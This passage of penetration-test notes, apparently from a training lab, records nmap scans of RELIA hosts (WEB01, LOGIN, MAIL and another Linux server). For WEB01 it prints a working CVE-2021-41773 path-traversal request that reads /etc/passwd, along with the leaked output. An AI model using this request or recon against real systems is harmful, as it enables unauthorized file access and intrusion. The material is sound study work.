|_http-title: Code Validation
|_http-server-header: Apache/2.4.52 (Ubuntu)
443/tcp  open  ssl/http syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Code Validation
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Issuer: commonName=demo
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-10-12T07:46:27
| Not valid after:  2032-10-09T07:46:27
| MD5:   6361:be08:5259:3a75:cd26:f869:1614:3c94
| SHA-1: 8fa0:04a7:5d03:4c29:44b7:6b14:119f:fd79:3c7e:5093
| -----BEGIN CERTIFICATE-----
| MIIC6TCCAdGgAwIBAgIUIN3Z/giwrWikVN/gzzofa98CJ1AwDQYJKoZIhvcNAQEL
| BQAwDzENMAsGA1UEAwwEZGVtbzAeFw0yMjEwMTIwNzQ2MjdaFw0zMjEwMDkwNzQ2
| MjdaMA8xDTALBgNVBAMMBGRlbW8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCMPw2+IkC55uip8gDmvy+mN/FtQJBck6audIht6POsdrE2GzfhAoxZY9al
| XkTc3WPOxP2X1I4ea1t1y8SQuX7jomUlNOgkGtVbj+RYzU8Qau7XWSTBMbVkRluc
| B+w5vPsGL1XGMd35V7Td6ZhotXLwc0j19smwewETujURfSmGCKdwbHztKozyW9Qg
| QFOtNI4gOHpvMxTYpR3QDkBYvIzaH+FaU8xqrr/GJiFSz8MUhxVPSM2QyqSmsFyE
| HYijIDbxBNRyf1lAmReLdwpwGqpRvBF1wYfpYyTvjW/j0LQPfvCcCVxD1v/3N3oK
| VR4/EYqBrCr9umF7Q3w5E4hC0x5VAgMBAAGjPTA7MAkGA1UdEwQCMAAwDwYDVR0R
| BAgwBoIEZGVtbzAdBgNVHQ4EFgQUqWpscb2cgQbMGE4Nh4vVDLAs55EwDQYJKoZI
| hvcNAQELBQADggEBACvVHEqW54LzwFNKfLMlbbrSitnXhGc1zgOaYdBnF95weO3j
| 5gEbGNElednFgWQEZzLz5ruS9i0aiKsQYKuh+AL+QQRdycfCbTxDVTopO9sxFYGd
| UpSxCGToYe5JULiNpnBpTWPEldc608y2jhpJpsH5UGifvRp/VpHW/3A+9t8oAUeN
| /SVW3bQ7sLEEvCmHH4E1uJS3k6kBidDY1A9OOxaL0k2v/cB8PONnEMwP4DcmKRA1
| cVrgXiR8x7E5zcVUPj8cM5+DqSOQTAphAcVbVx2c/K2XMENFZqVUbRFbuZSXVExp
| TQICNlWeutzCZGE7rREsIUUIigT9erEAvTu28RI=
|_-----END CERTIFICATE-----
2222/tcp open  ssh      syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpVNr/0MSfOq95rNQVnUXG+NF7yHDkPeFEXylLHxnZSqLAEqWi+z67gxHF0QVSjtaeEVbOnind7C3LKLGe1b8g=
|   256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFcUmhqn+iJNZi0wDswh/Jusg6ZX0SGGoKcsNCB69vQA
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=32802%PV=Y%DS=4%DC=T%G=N%TM=68A34279
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=F6%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11N
OS:W7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

```
## 245  WEB01
### open ports
```
Open 192.168.102.245:21
Open 192.168.102.245:80
Open 192.168.102.245:443
Open 192.168.102.245:8000
```
### details
```
PORT     STATE SERVICE  REASON         VERSION
21/tcp   open  ftp      syn-ack ttl 61 vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.233
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http     syn-ack ttl 61 Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| cve-2021-41773: Target is VULNERABLE to CVE-2021-41773
| Request URL: http://192.168.102.245:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
| Status: 200
| Sample response:
| root:x:0:0:root:/root:/bin/bash
| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
| bin:x:2:2:bin:/bin:/usr/sbin/nologin
| sys:x:3:3:sys:/dev:/usr/sbin/nologin
| sync:x:4:65534:sync:/bin:/bin/sync
|_games:x:5:6
|_http-title: RELIA Corp.
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
| CVE-2021-41773: 
|   VULNERABLE:
|   Apache 2.4.49 - Path Traversal
|     State: VULNERABLE
|     IDs:  CVE:CVE-2021-41773
|     Risk factor: HIGH
|                   A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. 
|                   An attacker could use a path traversal attack to map URLs to files outside the expected document root. 
|                   If files outside of the document root are not protected by "require all denied" these requests can succeed. 
|                   Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
|       
|               
|     Disclosure date: 2021-10-05
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2021-41773
|       https://twitter.com/h4x0r_dz/status/1445401960371429381
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
443/tcp  open  ssl/http syn-ack ttl 61 Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
| cve-2021-41773: Target is VULNERABLE to CVE-2021-41773
| Request URL: http://192.168.102.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
| Status: 200
| Sample response:
| root:x:0:0:root:/root:/bin/bash
| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
| bin:x:2:2:bin:/bin:/usr/sbin/nologin
| sys:x:3:3:sys:/dev:/usr/sbin/nologin
| sync:x:4:65534:sync:/bin:/bin/sync
|_games:x:5:6
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE/localityName=Munich/organizationalUnitName=IT Department
| Issuer: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE/localityName=Munich/organizationalUnitName=IT Department
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-10-12T08:55:44
| Not valid after:  2032-10-09T08:55:44
| MD5:   fa8f:53d5:841c:47dc:ac0c:8d5a:3acb:43a7
| SHA-1: 9fd6:3372:2dfd:ed09:0915:6b60:2604:b238:f02a:eab7
| -----BEGIN CERTIFICATE-----
| MIIFwzCCA6ugAwIBAgIUeHYKv7Q6RVr2ddFUOW0AXtsILAEwDQYJKoZIhvcNAQEL
| BQAwcTELMAkGA1UEBhMCREUxDzANBgNVBAgMBkJlcmxpbjEPMA0GA1UEBwwGTXVu
| aWNoMQ4wDAYDVQQKDAVSRUxJQTEWMBQGA1UECwwNSVQgRGVwYXJ0bWVudDEYMBYG
| A1UEAwwPd2ViMDEucmVsaWEuY29tMB4XDTIyMTAxMjA4NTU0NFoXDTMyMTAwOTA4
| NTU0NFowcTELMAkGA1UEBhMCREUxDzANBgNVBAgMBkJlcmxpbjEPMA0GA1UEBwwG
| TXVuaWNoMQ4wDAYDVQQKDAVSRUxJQTEWMBQGA1UECwwNSVQgRGVwYXJ0bWVudDEY
| MBYGA1UEAwwPd2ViMDEucmVsaWEuY29tMIICIjANBgkqhkiG9w0BAQEFAAOCAg8A
| MIICCgKCAgEAsY6LfzTZE+dzfwOewiq+M27qwGIR6RP98e8SeE5/BFWcuI+C0v0q
| iEjF+srnl8uXzcrcQI2UoAltroZSlWODmXW2azKMqmhVnVHUR1QDthJdU70aNzEN
| uAYaZiVtqjtjeIGvPNiaCmtfZ/2J8ows8R5eh/RRLBA7QCPJrnbeCEodKY8oyHLK
| KyBiu83Qrz0QsgOFDd/grmcGh+LqXaGfKE7mO8qazGxwDCCbTUEG6W/xK1gG74TL
| OkstIlBODsdr9s4dPobMSmT0TsOCcwzBGgyMVyYf3eiD1Xqz6ysrxwxPvRmNOa3c
| P5Hj6gn2SgAqP4sZEgy47k6XuSz7ZGDDG473SE4FFJ9bt7PQ77onCsiav2icJ52v
| JMWbTpErXaTvkcsbxS1xgEfD/1+XeoAe3cfKu4BEZMwZ61a2sgnOWZfIH5Is/g3X
| 4f1/b0oFDWxH/Xz/eHouZpLbu64Jil0+WVG4eI5dY/x/F2y/uSjmO2NTxQhO5nHl
| Xf1kiPLDO4iKbtyf3G4sSwVUyXXiQREE69eKtQIiVhfoEJ7CCYakNXBLdcReemTV
| W48FqqKWhJ+27mhMUAj42mCLjDb8DUBmLPYMpkxupbN2osiATuHO9diBFMTZ27Oh
| BOp9S7MpYl1y9iybUnISwMFxjORLWyBC4rAmzu59yYErbvUi12ge/AkCAwEAAaNT
| MFEwHQYDVR0OBBYEFA6/MNuj3vksQVoClyEc0RHjulrJMB8GA1UdIwQYMBaAFA6/
| MNuj3vksQVoClyEc0RHjulrJMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQEL
| BQADggIBAFsl8YDtmYCcjjC1Oja36hpyktF1LWEuVpR/eBXzwmfxxqyRZ/BTnARx
| Mj83mvizGUBEp3OgaJtAPlvBZr/lb8VT+DE7Y32ULBAboC0cpAtCl1+sjsFpy943
| 5RUZZqqIi4nfu12yIxsvVTiGzmPOoWjZuHQ60qgZBhPDUggbqySR2NBjYddGzxlx
| N4J02WB19bv1Z56G48YPMxKmweIvmXrRqs/cKRCy6p0j/8dp9us7MwEMgbGm8EPp
| Z59LYoD6V6KgX2ybhCtt1sPINuwGZ8DCnc5Hyk9Nvr791euzIpIcFhxXHmUGNwil
| HuCulKvaX3jEujG3PDOONuN7sqXdzWbIbj0MuRJGwMLRjFmSgg4XA5CMAHtHAeiT
| /S8cjaLwDptGLrgHvQhjfbvuC+2Qk3HCZC4bZdWBEjr62VmLiGynXI+6VtYNlAj8
| eJYf2lAGpJjwVh+ZtZE9dh2fIPxLTkwS69H2yzl0KfWJX0I/u0dJGD5lTb/21nfe
| Q8AwiecYICAggab3VcY5RzSSZ0Iwc7b5AijjqP4WBPasCQWcCG3l7uOoAsY/21eg
| FQbyRupm5N2B0+BMBNNA4o7z75mMpe/liQyeRBWlrrU4a9aX9iDKQRN2stfmxeBx
| ocvN1oS/2IZbuPCdsg7/xgo+CplY0cBFwHFz8mhspJbvaFzQXWeA
|_-----END CERTIFICATE-----
|_http-title: RELIA Corp.
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_ssl-date: TLS randomness does not represent time
| CVE-2021-41773: 
|   VULNERABLE:
|   Apache 2.4.49 - Path Traversal
|     State: VULNERABLE
|     IDs:  CVE:CVE-2021-41773
|     Risk factor: HIGH
|                   A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. 
|                   An attacker could use a path traversal attack to map URLs to files outside the expected document root. 
|                   If files outside of the document root are not protected by "require all denied" these requests can succeed. 
|                   Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
|       
|               
|     Disclosure date: 2021-10-05
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2021-41773
|       https://twitter.com/h4x0r_dz/status/1445401960371429381
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
8000/tcp open  http     syn-ack ttl 61 Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_http-open-proxy: Proxy might be redirecting requests
| cve-2021-41773: Target is VULNERABLE to CVE-2021-41773
| Request URL: http://192.168.102.245:8000/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
| Status: 200
| Sample response:
| root:x:0:0:root:/root:/bin/bash
| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
| bin:x:2:2:bin:/bin:/usr/sbin/nologin
| sys:x:3:3:sys:/dev:/usr/sbin/nologin
| sync:x:4:65534:sync:/bin:/bin/sync
|_games:x:5:6
| CVE-2021-41773: 
|   VULNERABLE:
|   Apache 2.4.49 - Path Traversal
|     State: VULNERABLE
|     IDs:  CVE:CVE-2021-41773
|     Risk factor: HIGH
|                   A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. 
|                   An attacker could use a path traversal attack to map URLs to files outside the expected document root. 
|                   If files outside of the document root are not protected by "require all denied" these requests can succeed. 
|                   Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
|       
|               
|     Disclosure date: 2021-10-05
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2021-41773
|       https://twitter.com/h4x0r_dz/status/1445401960371429381
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/18%OT=21%CT=%CU=38926%PV=Y%DS=4%DC=T%G=N%TM=68A342D5
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11N
OS:W7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

```
## 191 LOGIN
### open ports
```
Open 192.168.102.191:80
Open 192.168.102.191:135
Open 192.168.102.191:139
Open 192.168.102.191:445
Open 192.168.102.191:3389
Open 192.168.102.191:5985
Open 192.168.102.191:47001
Open 192.168.102.191:49664
Open 192.168.102.191:49667
Open 192.168.102.191:49665
Open 192.168.102.191:49666
Open 192.168.102.191:49670
Open 192.168.102.191:49668
Open 192.168.102.191:49671
Open 192.168.102.191:49669
```
### details
```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=192.168.102.191
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2025-08-18T15:14:20+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: LOGIN
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: login.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-18T15:14:11+00:00
| ssl-cert: Subject: commonName=login.relia.com
| Issuer: commonName=login.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-17T15:04:17
| Not valid after:  2026-02-16T15:04:17
| MD5:   f8d4:5525:0507:2c20:d3ed:9345:c45e:d822
| SHA-1: d078:4d0d:5de3:2ecc:dc57:8be1:0609:393f:5547:f15c
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQGKu/++KA1qFO3d4QU7LcvjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9sb2dpbi5yZWxpYS5jb20wHhcNMjUwODE3MTUwNDE3WhcNMjYw
| MjE2MTUwNDE3WjAaMRgwFgYDVQQDEw9sb2dpbi5yZWxpYS5jb20wggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQC9MtAZoO6MR6cGUMT2xXcbEw5xuHns2dsI
| ZYNRfK1qx2QJQD9K3I30nDQ5rCDcggOSXLDpquz77XxuVSdn97qtPOhJ6CxGcHma
| QM6mrM3ngIpjTCM3Xhzfv7FfGv6FnZEP0e3AcDZ3KHoRnsYwKi5BJkJCxobyWs2Y
| +zPftXMJoyy7/3P5C/nc3WvZ60U6selycddB1ZLsJ1tGVFFOIksTcUhaQ7k3xDx2
| M4wYmQeZyasy+6WOvfXyPYVwltiuvtIet9pH8HxT5Dk6uiYgrHqYrB/4EwzOZr+y
| ACHK9h/FvpMsdspkEQphH+ARvUaP0d11TK5pguHGl+e2Z4kdA7r5AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAIBIu7RpWTyek+JxXg/KATcf9v8zL2kMHiJP5m6GMvrRqyNTaFVX48ODa
| k8XWLz7YfmX2cWeRo11cQrWwhIHow8T7yD3Ob2gmjuqRoNI07Gbv0FzePNssTJ5J
| ux6q3Uz8fJJg6WSLehF+JZxIlsBsk/uBarG9mayoVlvE9JlB+R5TMVBzpBXoyp6F
| mDu8o51Bpr/CHA2KQ99xd32vQ8FqyPa+QTcMO18Y2y3BRRBBCyUSkPyXGfg4ndkk
| wokludAgpWhsom2INoaEOcrO+fdBIRVq+ZWuty72GmaFpdlgswNPwoRyJDyGwvV0
| Y91qR+va3MzHyFx7JwwS6xBESebrHQ==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 1607 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows Server 2012 Data Center (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=43691%PV=Y%DS=4%DC=T%G=N%TM=68A3434C%P=x86_64-pc-linux-gnu)
SEQ()
SEQ(SP=107%GCD=1%ISR=106%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=N)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=N)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=N)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2025-08-18T15:14:13
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52887/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31639/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 12812/udp): CLEAN (Timeout)
|   Check 4 (port 22119/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```
## 189 MAIL
### open ports
```
Open 192.168.102.189:25
Open 192.168.102.189:110
Open 192.168.102.189:135
Open 192.168.102.189:139
Open 192.168.102.189:143
Open 192.168.102.189:445
Open 192.168.102.189:587
Open 192.168.102.189:5985
Open 192.168.102.189:47001
Open 192.168.102.189:49664
Open 192.168.102.189:49666
Open 192.168.102.189:49665
Open 192.168.102.189:49667
Open 192.168.102.189:49668
Open 192.168.102.189:49670
Open 192.168.102.189:49669
```
### details
```
PORT      STATE SERVICE       REASON          VERSION
25/tcp    open  smtp          syn-ack ttl 125 hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          syn-ack ttl 125 hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack ttl 125 hMailServer imapd
|_imap-capabilities: OK completed SORT RIGHTS=texkA0001 CHILDREN QUOTA IMAP4 CAPABILITY NAMESPACE IMAP4rev1 IDLE ACL
445/tcp   open  microsoft-ds? syn-ack ttl 125
587/tcp   open  smtp          syn-ack ttl 125 hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1607 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=25%CT=%CU=35363%PV=Y%DS=4%DC=T%G=N%TM=68A343EA%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10C%TI=I%CI=I%TS=A)
SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.011 days (since Mon Aug 18 11:01:12 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 47593/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60626/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 54694/udp): CLEAN (Failed to receive data)
|   Check 4 (port 17118/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-08-18T15:16:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```